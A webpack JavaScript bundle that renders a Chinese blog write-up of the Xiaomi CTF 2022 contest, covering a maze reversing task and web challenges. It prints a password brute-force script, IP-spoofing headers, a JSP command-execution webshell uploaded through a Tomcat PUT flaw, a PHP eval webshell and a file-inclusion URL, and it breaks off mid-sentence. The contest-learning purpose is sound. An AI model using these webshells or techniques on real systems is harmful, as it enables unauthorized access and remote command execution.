/*! For license information please see 5578.cfc7e368.js.LICENSE.txt */
(self.webpackChunk_sumyblog_rspress_blog=self.webpackChunk_sumyblog_rspress_blog||[]).push([["5578"],{53802:function(e,n,a){"use strict";e.exports=a.p+"static/image/android-2-1.c1e2cfbf.png"},68947:function(e,n,a){"use strict";e.exports=a.p+"static/image/android-2-2.fb776133.png"},96972:function(e,n,a){"use strict";e.exports=a.p+"static/image/embedded-1-1.9f8a2111.png"},87886:function(e,n,a){"use strict";e.exports=a.p+"static/image/misc-1-1.f15906f1.png"},98657:function(e,n,a){"use strict";e.exports=a.p+"static/image/misc-2-1.9631d431.png"},81183:function(e,n,a){"use strict";e.exports=a.p+"static/image/misc-2-2.26b6234c.png"},16430:function(e,n,a){"use strict";e.exports=a.p+"static/image/re-1-1.87e14cf1.png"},85412:function(e,n,a){"use strict";e.exports=a.p+"static/image/re-1-2.d8abe272.png"},67286:function(e,n,a){"use strict";e.exports=a.p+"static/image/re-1-3.1b956e50.png"},14404:function(e,n,a){"use strict";e.exports=a.p+"static/image/web-1-1.658db9ba.png"},63218:function(e,n,a){"use strict";e.exports=a.p+"static/image/web-11-1.d9c1f1a1.png"},54911:function(e,n,a){"use strict";e.exports=a.p+"static/image/web-2-1.45cef1e3.png"},45162:function(e,n,a){"use strict";e.exports=a.p+"static/image/web-23-1.71fd5ece.png"},55343:function(e,n,a){"use strict";e.exports=a.p+"static/image/web-23-2.dc142e15.png"},20526:function(e,n,a){"use strict";e.exports=a.p+"static/image/web-4-1.5a6b34a6.png"},52349:function(e,n,a){"use strict";e.exports=a.p+"static/image/web-5-1.5a9fd646.png"},69111:function(e,n,a){"use strict";e.exports=a.p+"static/image/web-6-1.839b91dc.png"},86736:function(e,n,a){"use strict";e.exports=a.p+"static/image/web-6-2.5f5c79be.png"},63987:function(e,n,a){"use strict";e.exports=a.p+"static/image/web-7-1.e495bf82.png"},84255:function(e,n,a){"use strict";e.exports=a.p+"static/image/web-9-1.14bde0bc.png"},57167:function(e,n,a){"use strict";a.r(n);var t=a("35250"),r=a("51325"),s=a("16430"),i=a("85412"),d=a("67286"),c=a("14404"),l=a("54911"),o=a("20526"),h=a("52349"),p=a("69111"),m=a("86736"),u=a("63987"),x=a("84255"),g=a("63218"),f=a("45162"),b=a("55343"),j=a("96972"),w=a("87886"),_=a("98657"),y=a("81183"),k=a("53802"),S=a("68947");function T(e){let n=Object.assign({h1:"h1",a:"a",blockquote:"blockquote",p:"p",h2:"h2",img:"img",pre:"pre",code:"code",ul:"ul",li:"li"},(0,r.useMDXComponents)(),e.components);return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsxs)(n.h1,{id:"\u5C0F\u7C73ctf2022\u5B89\u5168\u8D5B\u9053writeup",children:[(0,t.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#\u5C0F\u7C73ctf2022\u5B89\u5168\u8D5B\u9053writeup",children:"#"}),"\u5C0F\u7C73CTF2022\u5B89\u5168\u8D5B\u9053writeup"]}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:"\u53C2\u52A0\u4E86\u4E0BCTF\u6BD4\u8D5B\uFF0C\u6700\u7EC8\u83B7\u5F97\u4E86\u7B2C\u4E94\u540D\u7684\u6210\u7EE9\u3002\u5956\u54C1\u662F\u4E2A\u7535\u70E4\u7BB1\uFF0C\u5F88\u559C\u6B22\u7684\u4E00\u4E2A\u5956\u54C1\u56E0\u4E3A\u51AC\u5929\u70E4\uD83C\uDF60\u771F\u7684\u597D\u68D2\u3002\n\u505ACTF\u57FA\u672C\u4E0A\u5C31\u662F\u8FB9\u5B66\u8FB9\u505A\uFF0C\u8FD9\u7BC7\u6587\u7AE0\u4E3B\u8981\u8BB0\u5F55\u4E0B\u8FC7\u4E86\u7684CTF\u9898\u76EE\uFF0C\u4EE5\u53CA\u4E00\u4E9B\u89E3\u9898\u601D\u8DEF\u3002"}),"\n"]}),"\n",(0,t.jsxs)(n.h2,{id:"re-1-maze",children:[(0,t.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#re-1-maze",children:"#"}),"re-1 maze"]}),"\n",(0,t.jsx)(n.p,{children:"\u4F7F\u7528IDA pro\u53CD\u7F16\u8BD1\u4F2A\u4EE3\u7801"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"\u53CD\u7F16\u8BD1\u7ED3\u679C",src:s})}),"\n",(0,t.jsx)(n.p,{children:"\u5927\u6982\u903B\u8F91\u662F\uFF0C\u8F93\u51651234\u7EC4\u6210\u768420\u4F4D\u5B57\u7B26\u4E32\u3002\u6839\u636E\u9898\u76EE\u63CF\u8FF0\u2014\u2014\u8FF7\u5BAB\uFF0C\u53EF\u4EE5\u5C06v5\u548Cv6\u7406\u89E3\u4E3A\u6A2A\u5750\u6807\u548C\u7EB5\u5750\u6807\uFF0C1234\u8868\u793A\u4E0B\u4E0A\u53F3\u5DE6\u3002\u9700\u8981\u4ECE\u5DE6\u4E0A\u8D70\u5230\u53F3\u4E0B\u3002\n\u8FF7\u5BAB\u7684\u5730\u56FE\u5728box\u4E2D\u5B9A\u4E49\uFF0C1\u662F\u4E0D\u53EF\u901A\u8FC7\uFF0C2\u662F\u53EF\u4EE5\u901A\u8FC7\u3002"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"\u5730\u56FE\u6570\u636E",src:i})}),"\n",(0,t.jsx)(n.p,{children:"\u8F6C\u6362\u6210\u5730\u56FE\uFF08\u624B\u7ED8\u4E86\u4E00\u4E0B\uFF0C\u5927\u6982\u770B\u4E00\u4E0B\uFF09"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"\u624B\u7ED8\u5730\u56FE",src:d})}),"\n",(0,t.jsx)(n.p,{children:"\u6309\u7167\u6B65\u9AA4\u884C\u8D70\uFF0C\u6700\u7EC8\u5F97\u5230flag"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-text",meta:"",children:"flag{13113111332232331111}\n"})}),"\n",(0,t.jsxs)(n.h2,{id:"web-1-\u7B7E\u5230\u9898",children:[(0,t.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-1-\u7B7E\u5230\u9898",children:"#"}),"web-1 \u7B7E\u5230\u9898"]}),"\n",(0,t.jsx)(n.p,{children:"\u7B7E\u5230\u9898"}),"\n",(0,t.jsx)(n.p,{children:"\u6253\u5F00\u63A7\u5236\u53F0\u627E\u5230\u6CE8\u91CA\u91CC\u7684flag"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"\u5728html\u6CE8\u91CA\u91CC",src:c})}),"\n",(0,t.jsxs)(n.h2,{id:"web-2-\u4F60\u4F1A\u6293\u5305\u5417",children:[(0,t.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-2-\u4F60\u4F1A\u6293\u5305\u5417",children:"#"}),"web-2 \u4F60\u4F1A\u6293\u5305\u5417"]}),"\n",(0,t.jsx)(n.p,{children:"\u8BF7\u6C42\u54CD\u5E94\u5934\u91CC\u627E\u5230flag"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"\u8FD9\u6B21\u5728\u8BF7\u6C42\u5934\u91CC",src:l})}),"\n",(0,t.jsxs)(n.h2,{id:"web-3-\u7206\u7834\u5F31\u53E3\u4EE4",children:[(0,t.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-3-\u7206\u7834\u5F31\u53E3\u4EE4",children:"#"}),"web-3 \u7206\u7834\u5F31\u53E3\u4EE4"]}),"\n",(0,t.jsx)(n.p,{children:"6\u4F4D\u5BC6\u7801\u5F88\u6162\uFF0C\u82B11\u79EF\u5206\u4E70\u4E2Ahint\uFF0C\u96BE\u5EA6\u7ACB\u5373\u964D\u4F4E\u3002"}),"\n",(0,t.jsx)(n.p,{children:"\u7206\u7834\u4EE3\u7801"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",meta:"",children:"import requests\n\nurl = \"https://httpbasic-ctfd.dun.mi.com/\"\n\npayload = {}\nheaders = {\n    'authority': 'httpbasic-ctfd.dun.mi.com',\n    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',\n    'accept-language': 'zh-CN,zh;q=0.9,en;q=0.8',\n    # 'authorization': 'Basic YWRtaW46OTg3NjU0',\n    'cache-control': 'max-age=0',\n    'cookie': 'xx', # TODO \u8D4B\u503Ccookie\n    'sec-ch-ua': '\"Chromium\";v=\"104\", \"/Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"104\"',\n    'sec-ch-ua-mobile': '?0',\n    'sec-ch-ua-platform': '\"macOS\"',\n    'sec-fetch-dest': 'document',\n    'sec-fetch-mode': 'navigate',\n    'sec-fetch-site': 'none',\n    'sec-fetch-user': '?1',\n    'upgrade-insecure-requests': '1',\n    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36'\n}\n\nusername = 'admin'\nfor passwd in range(300, 999):\n    passwd_str = \"{0:06d}\".format(passwd * 1000 + 672)\n    response = requests.request(\"GET\", url, headers=headers, data=payload, auth=(username, passwd_str))\n\n    print(passwd_str, response.status_code)\n    print(response.text)\n    if response.status_code != 401:\n        break\n"})}),"\n",(0,t.jsxs)(n.h2,{id:"web-4-\u624B\u901F\u8981\u5FEB",children:[(0,t.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-4-\u624B\u901F\u8981\u5FEB",children:"#"}),"web-4 \u624B\u901F\u8981\u5FEB"]}),"\n",(0,t.jsx)(n.p,{children:"\u7F51\u9875\u4F1A\u81EA\u52A8\u8DF3\u8F6C\uFF0C\u4F7F\u7528postman\u8BF7\u6C42\uFF0C\u5728\u6E90\u7801\u4E2D\u770B\u5230flag\u3002\u63A7\u5236\u53F0\u4FDD\u7559\u65E5\u5FD7\u8DF3\u8F6C\u4E5F\u53EF\u4EE5\u3002"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"postman",src:o})}),"\n",(0,t.jsxs)(n.h2,{id:"web-5-actuator\u914D\u7F6E\u4E0D\u5F53\u4F1A\u53D1\u751F\u4EC0\u4E48\u5462",children:[(0,t.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-5-actuator\u914D\u7F6E\u4E0D\u5F53\u4F1A\u53D1\u751F\u4EC0\u4E48\u5462",children:"#"}),"web-5 Actuator\u914D\u7F6E\u4E0D\u5F53\u4F1A\u53D1\u751F\u4EC0\u4E48\u5462"]}),"\n",(0,t.jsx)(n.p,{children:"\u8BBF\u95EEspring\u9ED8\u8BA4actuator\u5730\u5740\uFF0C\u5728env\u4E2D\u627E\u5230flag\u3002"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.a,{href:"https://actuator-ctfd.dun.mi.com/actuator/env",target:"_blank",rel:"noopener noreferrer",children:"https://actuator-ctfd.dun.mi.com/actuator/env"})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"actuator",src:h})}),"\n",(0,t.jsxs)(n.h2,{id:"web-6-\u63A5\u53E3\u6587\u6863\u5728\u54EA\u513F\u5462",children:[(0,t.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-6-\u63A5\u53E3\u6587\u6863\u5728\u54EA\u513F\u5462",children:"#"}),"web-6 \u63A5\u53E3\u6587\u6863\u5728\u54EA\u513F\u5462"]}),"\n",(0,t.jsx)(n.p,{children:"\u731C\u6D4B\u63A5\u53E3\u6587\u6863\u5730\u5740\uFF0Cspring\u6BD4\u8F83\u5E38\u7528\u7684\u63A5\u53E3\u6587\u6863\u670D\u52A1\u8FD8\u662Fswagger\uFF0C\u4F46\u662F\u6CA1\u6709\u914D\u7F6Eswagger-ui\u3002"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.a,{href:"https://api-doc-ctfd.dun.mi.com/v2/api-docs",target:"_blank",rel:"noopener noreferrer",children:"https://api-doc-ctfd.dun.mi.com/v2/api-docs"})}),"\n",(0,t.jsx)(n.p,{children:"\u5F80\u4E0B\u627E\u6709\u4E2Aflag-controller\uFF0Cpost\u8BF7\u6C42\uFF0C\u9700\u8981\u4E00\u4E2Aboolean\u53C2\u6570\u3002"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"api-docs",src:p})}),"\n",(0,t.jsx)(n.p,{children:"\u6784\u9020\u8BF7\u6C42\uFF0C\u83B7\u53D6flag"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"postman\u518D\u6B21",src:m})}),"\n",(0,t.jsxs)(n.h2,{id:"web-7-\u7834\u89E3uid",children:[(0,t.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-7-\u7834\u89E3uid",children:"#"}),"web-7 \u7834\u89E3uid"]}),"\n",(0,t.jsx)(n.p,{children:"\u7B80\u5355\u8BD5\u4E86\u4E00\u4E0B\uFF0Cuid\u8303\u56F4\u5927\u6982\u662F1-99\uFF0C\u5199\u4E2A\u7A0B\u5E8F\u904D\u5386\u4E00\u4E0B\uFF0C\u770B\u770B\u8F93\u51FA\u4EC0\u4E48"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",meta:"",children:"import requests\n\nurl = \"https://dior-ctfd.dun.mi.com/user?uid={}\"\n\npayload = {}\nheaders = {\n    'authority': 'dior-ctfd.dun.mi.com',\n    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',\n    'accept-language': 'zh-CN,zh;q=0.9,en;q=0.8',\n    'cache-control': 'max-age=0',\n    'cookie': 'xxx', # TODO cookie\n    'sec-ch-ua': '\"Chromium\";v=\"104\", \"/Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"104\"',\n    'sec-ch-ua-mobile': '?0',\n    'sec-ch-ua-platform': '\"macOS\"',\n    'sec-fetch-dest': 'document',\n    'sec-fetch-mode': 'navigate',\n    'sec-fetch-site': 'none',\n    'sec-fetch-user': '?1',\n    'upgrade-insecure-requests': '1',\n    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36'\n}\nfor uid in range(1, 100):\n    response = requests.request(\"GET\", url.format(uid), headers=headers, data=payload)\n    print(uid, response.text)\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u5728uid=77\u7684\u65F6\u5019\u53D1\u73B0flag"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"uid=77\u662F\u4E2A\u5409\u5229\u7684\u6570\u5B57",src:u})}),"\n",(0,t.jsxs)(n.h2,{id:"web-8-\u542C\u8BF4\u4F60\u4E5F\u4E86\u89E3http",children:[(0,t.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-8-\u542C\u8BF4\u4F60\u4E5F\u4E86\u89E3http",children:"#"}),"web-8 \u542C\u8BF4\u4F60\u4E5F\u4E86\u89E3HTTP"]}),"\n",(0,t.jsx)(n.p,{children:"\u5148\u6839\u636E\u63D0\u793A\u4E00\u6B65\u4E00\u6B65\u7684\u6784\u9020\u8BF7\u6C42\uFF0C\u5230\u6700\u540E\u4E00\u6B65\u9700\u8981\u672C\u5730IP\u624D\u80FD\u8BBF\u95EE\uFF0C\u901A\u8FC7header\u4F2A\u9020\u672C\u5730IP\u3002"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",meta:"",children:"curl --location --request POST 'https://httpheader-ctfd.dun.mi.com/?flag=i_want_it' \\\n--header 'authority: httpheader-ctfd.dun.mi.com' \\\n--header 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \\\n--header 'accept-language: zh-CN,zh;q=0.9,en;q=0.8' \\\n--header 'cache-control: max-age=0' \\\n--header 'cookie:xxx TODO cookie' \\\n--header 'sec-ch-ua: \"Chromium\";v=\"104\", \"/Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"104\"' \\\n--header 'sec-ch-ua-mobile: ?0' \\\n--header 'sec-ch-ua-platform: \"macOS\"' \\\n--header 'sec-fetch-dest: document' \\\n--header 'sec-fetch-mode: navigate' \\\n--header 'sec-fetch-site: none' \\\n--header 'sec-fetch-user: ?1' \\\n--header 'upgrade-insecure-requests: 1' \\\n--header 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36' \\\n--header 'Content-Type: application/json' \\\n--header 'X-Forwarded-For: 127.0.0.1' \\\n--header 'Proxy-Client-IP: 127.0.0.1' \\\n--header 'Referer: 127.0.0.1' \\\n--header 'X-Forwarded-For: 127.0.0.1' \\\n--header 'X-Forwarded: 127.0.0.1' \\\n--header 'Forwarded-For: 127.0.0.1' \\\n--header 'Forwarded: 127.0.0.1' \\\n--header 'X-Forwarded-Host: 127.0.0.1' \\\n--header 'X-remote-IP: 127.0.0.1' \\\n--header 'X-remote-addr: 127.0.0.1' \\\n--header 'True-Client-IP: 127.0.0.1' \\\n--header 'X-Client-IP: 127.0.0.1' \\\n--header 'Client-IP: 127.0.0.1' \\\n--header 'X-Real-IP: 127.0.0.1' \\\n--header 'Ali-CDN-Real-IP: 127.0.0.1' \\\n--header 'Cdn-Src-Ip: 127.0.0.1' \\\n--header 'Cdn-Real-Ip: 127.0.0.1' \\\n--header 'CF-Connecting-IP: 127.0.0.1' \\\n--header 'X-Cluster-Client-IP: 127.0.0.1' \\\n--header 'WL-Proxy-Client-IP: 127.0.0.1' \\\n--header 'Proxy-Client-IP: 127.0.0.1' \\\n--header 'Fastly-Client-Ip: 127.0.0.1' \\\n--header 'True-Client-Ip: 127.0.0.1' \\\n--form 'flag=\"i_want_it\"'\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u4E0D\u77E5\u9053\u54EA\u4E2A\u53C2\u6570\u7BA1\u7528\uFF0C\u4E00\u80A1\u8111\u5168\u90E8\u8BBE\u7F6E\u6210127.0.0.1\u5427"}),"\n",(0,t.jsxs)(n.h2,{id:"web-9-\u88AB\u6E05\u7A7A\u7684\u6587\u4EF6",children:[(0,t.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-9-\u88AB\u6E05\u7A7A\u7684\u6587\u4EF6",children:"#"}),"web-9 \u88AB\u6E05\u7A7A\u7684\u6587\u4EF6"]}),"\n",(0,t.jsx)(n.p,{children:"\u4E0B\u8F7D.bash_history\u6587\u4EF6\uFF0C\u4ECE\u6587\u4EF6\u4E2D\u627E\u5230flag"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"bash_history",src:x})}),"\n",(0,t.jsxs)(n.h2,{id:"web-10-\u4E00\u4E2A\u5B89\u5168\u914D\u7F6E\u5F15\u53D1\u7684\u8840\u6848",children:[(0,t.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-10-\u4E00\u4E2A\u5B89\u5168\u914D\u7F6E\u5F15\u53D1\u7684\u8840\u6848",children:"#"}),"web-10 \u4E00\u4E2A\u5B89\u5168\u914D\u7F6E\u5F15\u53D1\u7684\u8840\u6848"]}),"\n",(0,t.jsx)(n.p,{children:"\u8BE5\u9898\u4F7F\u7528 Tomcat \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u5206\u6790\uFF08CVE-2017-12615\uFF09"}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:"CVE-2017-12615\u6F0F\u6D1E\u5229\u7528\u9700\u8981\u5C06 readonly \u521D\u59CB\u5316\u53C2\u6570\u7531\u9ED8\u8BA4\u503C\u8BBE\u7F6E\u4E3A false\uFF0C\u7ECF\u8FC7\u5B9E\u9645\u6D4B\u8BD5\uFF0CTomcat 7.x\u7248\u672C\u5185web.xml\u914D\u7F6E\u6587\u4EF6\u5185\u9ED8\u8BA4\u914D\u7F6E\u65E0readonly\u53C2\u6570\uFF0C\u9700\u8981\u624B\u5DE5\u6DFB\u52A0\uFF0C\u9ED8\u8BA4\u914D\u7F6E\u6761\u4EF6\u4E0B\u4E0D\u53D7\u6B64\u6F0F\u6D1E\u5F71\u54CD\u3002\nApache Tomcat\u9ED8\u8BA4\u5F00\u542FPUT\u65B9\u6CD5\uFF0Corg.apache.catalina.servlets.DefaultServlet\u7684readonly\u9ED8\u8BA4\u4E3Atrue\uFF0C\u800C\u4E14\u9ED8\u8BA4\u6CA1\u6709\u5728conf/web.xml\u91CC\u5199\uFF0C\u9700\u8981\u624B\u5DE5\u6DFB\u52A0\u5E76\u4E14\u6539\u4E3Afalse\uFF0C\u624D\u53EF\u4EE5\u6D4B\u8BD5\u3002\n\u4E3B\u8981\u5728conf\u6587\u4EF6\u5939\u7684web.xml\u6587\u4EF6\u4E2D\u6DFB\u52A0readonly\u53C2\u6570\u5E76\u8BBE\u7F6E\u503C\u4E3Afalse\uFF1A"}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",meta:"",children:"<init-param>\n    <param-name>readonly</param-name>\n    <param-value>false</param-value>\n</init-param>\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u6839\u636E\u8981\u6C42\uFF0C\u6784\u9020PUT\u8BF7\u6C42\uFF0C\u4E0A\u4F20\u4E00\u53E5\u8BDD\uFF0C\u7136\u540E\u8681\u5251\u8FDE\u63A5\uFF0C\u4ECE\u76EE\u5F55\u4E2D\u627E\u5230flag"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",meta:"",children:"curl --location --request PUT 'https://tomcat-ctfd.dun.mi.com/sumy123123.jsp/' \\\n--header 'authority: tomcat-ctfd.dun.mi.com' \\\n--header 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \\\n--header 'accept-language: zh-CN,zh;q=0.9,en;q=0.8' \\\n--header 'cookie: xxxx TODO cookie' \\\n--header 'sec-ch-ua: \"Chromium\";v=\"104\", \"/Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"104\"' \\\n--header 'sec-ch-ua-mobile: ?0' \\\n--header 'sec-ch-ua-platform: \"macOS\"' \\\n--header 'sec-fetch-dest: document' \\\n--header 'sec-fetch-mode: navigate' \\\n--header 'sec-fetch-site: none' \\\n--header 'sec-fetch-user: ?1' \\\n--header 'upgrade-insecure-requests: 1' \\\n--header 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36' \\\n--header 'Content-Type: text/plain' \\\n--data-raw '<%\n  if(request.getParameter(\"cmd\")!=null){\n    java.io.InputStream in = Runtime.getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",request.getParameter(\"cmd\")}).getInputStream();\n    int a = -1;\n    byte[] b = new byte[1];\n    out.print(\"<pre>\");\n    while((a=in.read(b))!=-1){\n      out.print(new String(b));\n    }\n    out.print(\"</pre>\");\n  }\n%>'\n"})}),"\n",(0,t.jsxs)(n.h2,{id:"web-11-\u5C31\u4E00\u4E2A\u4E0A\u4F20\u64CD\u4F5C\u80FD\u6709\u5565\u95EE\u9898",children:[(0,t.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-11-\u5C31\u4E00\u4E2A\u4E0A\u4F20\u64CD\u4F5C\u80FD\u6709\u5565\u95EE\u9898",children:"#"}),"web-11 \u5C31\u4E00\u4E2A\u4E0A\u4F20\u64CD\u4F5C\u80FD\u6709\u5565\u95EE\u9898"]}),"\n",(0,t.jsx)(n.p,{children:"\u5148\u4E0A\u4F20\u4E00\u4E2A\u56FE\u7247\u7B80\u5355\u7684\u8BD5\u4E86\u4E0B\uFF0C\u53D1\u73B0\u6587\u4EF6\u88AB\u653E\u5728upload\u76EE\u5F55\u4E0B\uFF0C\u5E76\u4E14\u9875\u9762\u53EF\u4EE5\u8BBF\u95EE\u5230\u3002\u800C\u4E14\u6587\u4EF6\u540D\u8FD8\u662F\u4E0A\u4F20\u6587\u4EF6\u7684\u6587\u4EF6\u540D\u3002\u6587\u4EF6\u7C7B\u578B\u53EA\u652F\u6301.jpg|.png|.gif\uFF0C\u4F46\u662F\u8FD9\u4E2A\u7C7B\u578B\u5224\u65AD\u5728\u524D\u7AEF\u9875\u9762\u5224\u65AD\u3002\u60F3\u529E\u6CD5\u7ED5\u8FC7\u6587\u4EF6\u7C7B\u578B\u7684\u5224\u65AD\uFF0C\u4E0A\u4F20\u4E00\u53E5\u8BDD\uFF0C\u7136\u540E\u8681\u5251\u8FDE\u63A5\uFF0C\u83B7\u53D6flag\u3002"}),"\n",(0,t.jsx)(n.p,{children:"\u6784\u9020\u4E00\u53E5\u8BDD\u7684php\u6587\u4EF6"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-php",meta:"",children:"<?php @eval($_POST['flag']) ?>\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u4E0A\u4F20\u6587\u4EF6\uFF0C\u9875\u9762\u4E0B\u65AD\u70B9\uFF0C\u628A\u7C7B\u578B\u5224\u65AD\u6539\u6389"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"chrome devtool\u51FA\u573A",src:g})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-javascript",meta:"",children:'allow_ext=".php"\n'})}),"\n",(0,t.jsx)(n.p,{children:"\u8681\u5251\u8FDE\u63A5\u5B8C\u6BD5\u3002"}),"\n",(0,t.jsxs)(n.h2,{id:"web-12-\u53EA\u6709\u672C\u4EBA\u624D\u80FD\u67E5\u770B\u54E6",children:[(0,t.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-12-\u53EA\u6709\u672C\u4EBA\u624D\u80FD\u67E5\u770B\u54E6",children:"#"}),"web-12 \u53EA\u6709\u672C\u4EBA\u624D\u80FD\u67E5\u770B\u54E6"]}),"\n",(0,t.jsx)(n.p,{children:"\u6211\u4E5F\u5F88\u4E86\u89E3HTTP"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",meta:"",children:"curl --location --request GET 'http://10.38.204.122/' \\\n--header 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \\\n--header 'Accept-Language: zh-CN,zh;q=0.9,en;q=0.8' \\\n--header 'Cache-Control: max-age=0' \\\n--header 'Connection: keep-alive' \\\n--header 'Upgrade-Insecure-Requests: 1' \\\n--header 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36' \\\n--header 'X-Forwarded-For:  localhost' \\\n--header 'Referer:  http://localhost/'\n"})}),"\n",(0,t.jsxs)(n.h2,{id:"web-13-\u5199\u4E2Aphpinfo\u80FD\u6709\u591A\u5927\u98CE\u9669",children:[(0,t.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-13-\u5199\u4E2Aphpinfo\u80FD\u6709\u591A\u5927\u98CE\u9669",children:"#"}),"web-13 \u5199\u4E2Aphpinfo\u80FD\u6709\u591A\u5927\u98CE\u9669"]}),"\n",(0,t.jsx)(n.p,{children:"\u8FD9\u4E2A\u9898\u76EE\u5361\u4E86\u597D\u4E45\uFF0C\u901A\u8FC7url\u5224\u65AD\u8003\u67E5\u7684\u662Fphp\u6587\u4EF6\u5305\u542B\uFF0C\u6784\u9020filter\u6293\u53D6\u4E86index.php\u7684\u6587\u4EF6\uFF0C\u53D1\u73B0\u7279\u522B\u76F4\u767D\u3002"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.a,{href:"https://include-ctfd.dun.mi.com/index.php?page=php://filter/read=convert.base64-encode/resource=index.php",target:"_blank",rel:"noopener noreferrer",children:"https://include-ctfd.dun.mi.com/index.php?page=php://filter/read=convert.base64-encode/resource=index.php"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-php",meta:"",children:'<?php\nif ($_GET[page]) {\n    include $_GET[page];\n} else {\n    include "index.html";\n}\n'})}),"\n",(0,t.jsxs)(n.p,{children:["\u4F46\u662F ",(0,t.jsx)(n.code,{children:"php://input"})," 